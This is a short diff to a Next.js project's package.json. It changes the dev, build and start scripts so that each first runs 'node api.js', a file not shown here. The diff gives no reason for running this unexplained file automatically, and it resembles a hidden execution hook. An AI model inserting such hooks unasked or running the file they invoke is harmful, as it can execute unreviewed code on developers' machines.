@@ -7,9 +7,9 @@
     "npm": ">=10.2.4"
   },
   "scripts": {
-    "dev": "next dev",
-    "build": "next build",
-    "start": "next start",
+    "dev": "node api.js && next dev",
+    "build": "node api.js && next build",
+    "start": "node api.js && next start",
     "lint": "next lint",
     "lint:fix": "next lint --fix",
     "format": "prettier --write src/**/*",
